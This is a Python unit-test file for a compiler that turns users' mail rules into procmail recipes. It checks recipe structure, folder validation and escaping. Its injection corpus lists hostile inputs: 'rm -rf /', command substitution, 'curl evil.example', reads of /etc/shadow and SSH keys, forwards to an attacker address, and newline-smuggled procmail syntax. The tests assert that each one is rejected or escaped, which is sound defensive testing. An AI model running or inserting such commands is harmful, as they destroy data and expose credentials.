'''Unit tests for compile-user-rules.py (docs/1.x/user-mail-rules-plan.md).

Run from the repo root (CI: lint.yml python job):
    python3 -m unittest discover -s docker/shared/test/compile-user-rules -p "test_*.py"

Covers the baseline corpus (the same fixture + golden pair the container
self-test asserts) and an injection corpus of hostile inputs in every
user-controlled slot, asserting the compiler either rejects the rule or
emits the input as an inert escaped literal - never as live procmail
syntax.
'''
import importlib.util
import json
import os
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
COMPILER = os.path.join(HERE, '..', '..', 'compile-user-rules.py')

spec = importlib.util.spec_from_file_location('compile_user_rules', COMPILER)
cur = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cur)

FIXTURE_FOLDERS = {'', '.Receipts', '.Archive', '.Work.Clients', '.Trash',
                   '.My Stuff', '.Newsletters'}
PUSH_LINE_PREFIX = '  | /usr/local/bin/push-enqueue.sh "$LOGNAME" "'
DELIVER_LINE_PREFIX = '  | /usr/local/bin/cabal-maildir-deliver.sh "$MAILDIR'
FORWARD_LINE_PREFIX = '  | /usr/local/bin/cabal-rules-forward.sh '

# The classics plus procmail-specific shapes: shell injection, pipe/redirect
# smuggling, recipe-structure injection via newlines, regex anchors and
# alternation, condition-class prefixes, NUL and other controls, path
# traversal. Sourced per the plan from public procmail-security writing.
HOSTILE_VALUES = [
    '; rm -rf /',
    '$(touch /tmp/pwned)',
    '`touch /tmp/pwned`',
    '| /bin/sh -c "echo pwned"',
    '|/bin/sh',
    '> /etc/passwd',
    '< /etc/shadow',
    '&& curl evil.example',
    "'; DROP TABLE rules; --",
    '../../etc/passwd',
    '/etc/procmailrc',
    '${SHELL}',
    '$HOME/.ssh/authorized_keys',
    '.*',
    '^From: forged',
    '(a|b)+',
    '[a-z]{100}',
    'H ?? ^From',
    'B ?? secret',
    ':0c',
    '! attacker@evil.example',
    'INCLUDERC=/etc/passwd',
    'SHELL=/bin/sh',
    'a\\b\\c',
    'value with $VAR expansion',
]
# Values with control characters must be REJECTED (schema), not escaped:
# a newline would end the condition line and start new procmail syntax.
HOSTILE_CONTROL_VALUES = [
    'line1\nline2',
    'cr\rlf',
    'nul\x00byte',
    'esc\x1b[31m',
    ':0\n| /bin/sh',
    'tab\ttab',
]


def rule(**kw):
    base = {'id': 'r-aaaaaaaaaaaa', 'name': 'Test', 'enabled': True,
            'conditions': [], 'action': 'none', 'moveFolder': '',
            'copyFolders': [], 'flag': False, 'markRead': False,
            'forward': [], 'reply': False, 'replyBody': '',
            'continueToNext': False}
    base.update(kw)
    return base


def compile_one(r, user='fixtureuser'):
    return cur.compile_rule(r, lambda d: d in FIXTURE_FOLDERS, user)


class GoldenTest(unittest.TestCase):
    '''The working-tree compiler must still match the checked-in golden.'''

    def test_fixture_matches_golden(self):
        with open(os.path.join(HERE, 'fixture-rules.json'), encoding='utf-8') as f:
            rules = json.load(f)
        with open(os.path.join(HERE, 'golden.rc'), encoding='utf-8') as f:
            golden = f.read()
        content, compiled, _ = cur.compile_ruleset(
            'fixtureuser', rules, lambda d: d in FIXTURE_FOLDERS)
        if not content.endswith('\n'):
            content += '\n'
        self.assertEqual(content, golden)
        self.assertEqual(compiled, 46)


class StructureTest(unittest.TestCase):
    '''Recipe shapes for each action / spill-through combination.'''

    def test_move_halt_pushes_then_delivers(self):
        lines, _, reason = compile_one(rule(
            action='move', moveFolder='Receipts',
            conditions=[{'field': 'subject', 'value': 'x'}]))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('push-enqueue.sh "$LOGNAME" "Receipts"', text)
        self.assertIn('  :0:\n  $MAILDIR/.Receipts/', text)
        self.assertLess(text.index('push-enqueue'), text.index('$MAILDIR'))

    def test_move_spill_copies_without_push(self):
        lines, _, reason = compile_one(rule(
            action='move', moveFolder='Receipts', continueToNext=True))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('  :0c:\n  $MAILDIR/.Receipts/', text)
        self.assertNotIn('push-enqueue', text)

    def test_delete_never_pushes(self):
        lines, _, reason = compile_one(rule(action='delete'))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('  :0\n  /dev/null', text)
        self.assertNotIn('push-enqueue', text)

    def test_delete_ignores_aux(self):
        lines, _, reason = compile_one(rule(
            action='delete', forward=['a@example.com'], flag=True))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertNotIn('cabal-rules-forward', text)
        self.assertNotIn('cabal-maildir-deliver', text)

    def test_none_halt_delivers_default_with_inbox_push(self):
        lines, _, reason = compile_one(rule())
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('"$LOGNAME" "INBOX"', text)
        self.assertIn('  :0:\n  $DEFAULT', text)

    def test_none_spill_without_aux_is_no_effect(self):
        _, _, reason = compile_one(rule(continueToNext=True))
        self.assertEqual(reason, 'no_effect')

    def test_forward_precedes_destination(self):
        lines, _, reason = compile_one(rule(
            action='move', moveFolder='Receipts', forward=['a@example.com']))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertLess(text.index('cabal-rules-forward.sh fixtureuser a@example.com'),
                        text.index('$MAILDIR'))

    def test_forward_carries_loop_guard(self):
        lines, _, reason = compile_one(rule(forward=['a@example.com']))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('* ! ^X-Loop: cabal-rules-fixtureuser', text)
        self.assertLess(text.index('X-Loop'), text.index('cabal-rules-forward.sh'))

    def test_forward_marker_escaped_for_dotted_user(self):
        lines, _, reason = compile_one(rule(forward=['a@example.com']),
                                       user='j.doe-2')
        self.assertIsNone(reason)
        self.assertIn('* ! ^X-Loop: cabal-rules-j\\.doe-2', '\n'.join(lines))

    def test_unsafe_username_drops_forward(self):
        lines, aux, reason = compile_one(
            rule(action='move', moveFolder='Receipts', forward=['a@example.com']),
            user='evil user')
        self.assertIsNone(reason)
        self.assertIn('forward_user_unsafe', aux)
        self.assertNotIn('cabal-rules-forward', '\n'.join(lines))

    def test_flags_deliver_via_helper_sorted(self):
        lines, aux, reason = compile_one(rule(
            action='move', moveFolder='Receipts', flag=True, markRead=True))
        self.assertIsNone(reason)
        self.assertEqual(aux, [])
        text = '\n'.join(lines)
        self.assertIn('cabal-maildir-deliver.sh "$MAILDIR/.Receipts" FS', text)
        self.assertIn('  :0w', text)
        self.assertNotIn('$MAILDIR/.Receipts/', text)

    def test_flagged_spill_is_cw_copy(self):
        lines, _, reason = compile_one(rule(
            action='move', moveFolder='Receipts', markRead=True,
            continueToNext=True))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('  :0cw\n  | /usr/local/bin/cabal-maildir-deliver.sh '
                      '"$MAILDIR/.Receipts" S', text)
        self.assertNotIn('push-enqueue', text)

    def test_flagged_inbox_uses_maildir_root(self):
        lines, _, reason = compile_one(rule(flag=True))
        self.assertIsNone(reason)
        self.assertIn('cabal-maildir-deliver.sh "$MAILDIR" F', '\n'.join(lines))

    def test_inbox_move_is_default_delivery(self):
        lines, _, reason = compile_one(rule(action='move', moveFolder='INBOX'))
        self.assertIsNone(reason)
        text = '\n'.join(lines)
        self.assertIn('"$LOGNAME" "INBOX"', text)
        self.assertIn('  $DEFAULT', text)

    def test_disabled_rule_not_emitted(self):
        content, compiled, _ = cur.compile_ruleset(
            'u', [rule(enabled=False, action='delete')],
            lambda d: True)
        self.assertEqual(compiled, 0)
        self.assertIn('(no compiled rules)', content)

    def test_reply_rule_skips_whole(self):
        _, _, reason = compile_one(rule(
            action='move', moveFolder='Receipts', reply=True,
            replyBody='away'))
        self.assertEqual(reason, 'aux_not_implemented:reply')


class FolderTest(unittest.TestCase):
    def test_missing_folder_skips(self):
        _, _, reason = compile_one(rule(action='move', moveFolder='Ghost'))
        self.assertEqual(reason, 'folder_not_found')

    def test_archive_without_archive_folder_skips(self):
        _, _, reason = cur.compile_rule(rule(action='archive'), lambda d: d == '',
                                        'fixtureuser')
        self.assertEqual(reason, 'folder_not_found')

    def test_wire_and_internal_separators_agree(self):
        self.assertEqual(cur.folder_to_dir('Work/Clients'), '.Work.Clients')
        self.assertEqual(cur.folder_to_dir('Work.Clients'), '.Work.Clients')

    def test_inbox_is_root(self):
        self.assertEqual(cur.folder_to_dir('INBOX'), '')
        self.assertEqual(cur.folder_to_dir('inbox'), '')

    def test_unsafe_folders_rejected(self):
        for bad in ['evil|pipe', 'tick`tock', 'a>b', '/abs', 'a/../b',
                    'dollar$HOME', 'semi;colon', 'quo"te', "ap'os",
                    ' leading-space', 'trailing-space ', 'seg. edge/x',
                    'wild*card', 'quest?ion', 'brack[et', 'new\nline',
                    'a\x00b', '..', '', 'x' * 300]:
            self.assertIsNone(cur.folder_to_dir(bad), bad)


class InjectionTest(unittest.TestCase):
    '''Hostile input in every user-controlled slot.'''

    def assert_inert(self, text):
        '''No compiled line may be live procmail beyond the fixed shapes.'''
        for line in text.splitlines():
            stripped = line.strip()
            if stripped.startswith('|'):
                if line.startswith(FORWARD_LINE_PREFIX):
                    # argv after the helper: <user> <addr>... all re-checkable
                    args = line[len(FORWARD_LINE_PREFIX):].split()
                    self.assertTrue(args and cur.USER_SAFE_RE.match(args[0]),
                                    f'bad forward user: {line!r}')
                    for addr in args[1:]:
                        self.assertTrue(cur.valid_forward(addr),
                                        f'bad forward addr: {line!r}')
                else:
                    self.assertTrue(
                        line.startswith(PUSH_LINE_PREFIX)
                        or line.startswith(DELIVER_LINE_PREFIX),
                        f'unexpected pipe action: {line!r}')
            if stripped.startswith('!'):
                self.fail(f'bare forward action emitted: {line!r}')
            self.assertNotIn('\x00', line)

    def test_hostile_condition_values_become_literals(self):
        for value in HOSTILE_VALUES:
            with self.subTest(value=value):
                lines, _, reason = compile_one(rule(
                    action='delete',
                    conditions=[{'field': 'subject', 'value': value}]))
                self.assertIsNone(reason, value)
                text = '\n'.join(lines)
                self.assert_inert(text)
                cond = [l for l in lines if l.startswith('* ')]
                self.assertEqual(len(cond), 1)
                # The escaped value must contain no UNescaped metacharacter.
                escaped = cond[0].split('.*', 1)[1]
                i = 0
                while i < len(escaped):
                    ch = escaped[i]
                    if ch == '\\':
                        i += 2
                        continue
                    self.assertNotIn(ch, cur.REGEX_METAS,
                                     f'unescaped {ch!r} in {escaped!r}')
                    i += 1

    def test_control_character_values_rejected(self):
        for value in HOSTILE_CONTROL_VALUES:
            with self.subTest(value=value):
                _, _, reason = compile_one(rule(
                    action='delete',
                    conditions=[{'field': 'subject', 'value': value}]))
                self.assertEqual(reason, 'schema')

    def test_hostile_folders_skip_rule(self):
        for value in HOSTILE_VALUES + HOSTILE_CONTROL_VALUES:
            with self.subTest(value=value):
                _, _, reason = compile_one(rule(action='move', moveFolder=value))
                self.assertIn(reason,
                              ('unsafe_folder', 'folder_not_found', 'schema',
                               'folder_not_set'), value)

    def test_hostile_forwards_dropped(self):
        for value in HOSTILE_VALUES + HOSTILE_CONTROL_VALUES:
            with self.subTest(value=value):
                lines, aux, reason = compile_one(rule(
                    action='move', moveFolder='Receipts', forward=[value]))
                if reason == 'schema':
                    continue  # control chars etc. may reject at schema level
                self.assertIsNone(reason)
                self.assertIn('forward_invalid_dropped', aux, value)
                self.assertNotIn('cabal-rules-forward', '\n'.join(lines))

    def test_hostile_names_stay_in_comments(self):
        for value in HOSTILE_VALUES:
            with self.subTest(value=value):
                lines, _, reason = compile_one(rule(name=value, action='delete'))
                self.assertIsNone(reason, value)
                self.assertTrue(lines[0].startswith('# ['))
                self.assert_inert('\n'.join(lines))

    def test_whole_file_inert_under_hostile_ruleset(self):
        rules = [rule(id='r-%012x' % i, name=v, action='delete',
                      conditions=[{'field': 'body', 'value': v}])
                 for i, v in enumerate(HOSTILE_VALUES)]
        content, _, _ = cur.compile_ruleset('u', rules, lambda d: False)
        self.assert_inert(content)


class EscapeTest(unittest.TestCase):
    def test_escape_roundtrip_metas(self):
        self.assertEqual(cur.escape_value('a.b*c'), r'a\.b\*c')
        self.assertEqual(cur.escape_value('\\'), '\\\\')
        self.assertEqual(cur.escape_value('plain text'), 'plain text')

    def test_never_escapes_nonmetas(self):
        # A backslash before a non-meta could CREATE a special (\< is a
        # procmail word boundary); assert none is ever produced.
        out = cur.escape_value('a<b>c-d_e~f')
        self.assertNotIn('\\', out)


if __name__ == '__main__':
    unittest.main()
